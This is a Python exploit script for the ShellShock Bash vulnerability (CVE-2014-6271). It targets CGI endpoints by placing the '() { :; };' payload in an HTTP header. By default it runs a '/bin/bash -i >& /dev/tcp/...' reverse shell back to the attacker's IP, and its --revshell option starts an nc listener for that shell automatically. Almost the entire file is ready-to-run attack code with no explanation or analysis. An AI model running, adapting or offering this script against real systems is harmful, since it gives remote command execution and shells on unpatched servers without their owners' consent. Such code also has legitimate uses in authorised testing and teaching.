#!/usr/bin/python3
# ShellShock - Arbitrary Command Execution - Bash 1.14.0 < 4.3 

from argparse import ArgumentParser
from urllib.request import Request, urlopen
from subprocess import Popen
from time import sleep


def check_url(url:str) -> None:
    """Check url and return"""
    if not url.startswith('http'): 
        exit('URL not complete: http:// | https://')
    if '/cgi-bin/' in url: 
        return None
    else: 
        exit('No target script specified: /cgi-bin/<vulnerable>')


def create_payload(payload:str, cmd:str, lhost:str, lport:str, revshell:bool) -> str:
    """Return assembled payload."""
    if revshell:
        for i in (lhost, lport):
            cmd = cmd.replace('@', i, 1)
        return payload.replace('@', cmd, 1)
    else:
        return payload.replace('@', cmd, 1)


def create_req(url:str, header:str, payload:str) -> Request:
    """Return assemble http request."""
    return Request(url=url, headers={f'{header}':payload}, method='GET')


def revshell(listener:str, lport:str) -> None:
    """Establish revshell."""
    try:
        Popen(listener.replace('@', lport, 1).split())
        urlopen(req)
        sleep(60*60*24)
    except KeyboardInterrupt: 
        pass


if __name__ == '__main__':
    parser = ArgumentParser(
        prog='CVE-2014-6271',
        description='ShellShock - Arbitrary Command Execution - Bash 1.14.0 < 4.3  [CVE-2014-6271]',
        epilog='Please note that format brackets "{}" were replaced with "@"',
        usage='python3 CVE-2014-6271.py --lhost <your-ip> <url/cgi-bin/vuln> --revshell\nusage: python3 CVE-2014-6271.py -c "/bin/bash -c whoami" <url/cgi-bin/vuln>'
    )
    parser.add_argument('url', help='URL of target with /cgi-bin/<vulnerable>')
    parser.add_argument('--lhost', '-lh', required=False, default=None, help='listen IP')
    parser.add_argument('--lport', '-lp', required=False, type=str, default='9001', help='listen port')
    parser.add_argument('--revshell', '-r', required=False, action='store_true', default=False, help='set true to establish revshell automatically, lhost required')
    parser.add_argument('--cmd', '-c', required=False, default='/bin/bash -i >& /dev/tcp/@/@ 0>&1', help='command to execute, by default revshell')
    parser.add_argument('--header', '-H', required=False, type=str, default='user-agent', help='abused header')
    parser.add_argument('--payload', '-P', required=False, type=str, default='() { :; }; echo; echo; @', help='payload to abuse vulnerability')
    parser.add_argument('--listen', '-l', required=False, type=str, default='nc -vlnp @', help='listener to use')
    args = parser.parse_args()

    check_url(args.url)
    payload = create_payload(args.payload, args.cmd, args.lhost, args.lport, args.revshell)
    req = create_req(args.url, args.header, payload)
    if args.revshell:
        revshell(args.listen, args.lport)
    else:
        print(urlopen(req).read().decode())
